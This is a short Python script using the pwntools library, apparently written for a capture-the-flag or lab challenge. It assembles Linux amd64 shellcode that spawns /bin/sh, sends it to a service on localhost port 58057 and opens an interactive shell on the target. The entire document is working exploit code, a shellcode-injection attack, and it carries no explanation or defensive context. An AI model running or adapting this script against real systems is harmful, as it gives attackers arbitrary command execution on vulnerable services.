from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
shellcode = asm(shellcraft.sh())

re = remote("localhost",58057)

re.sendline(shellcode)
re.interactive()       
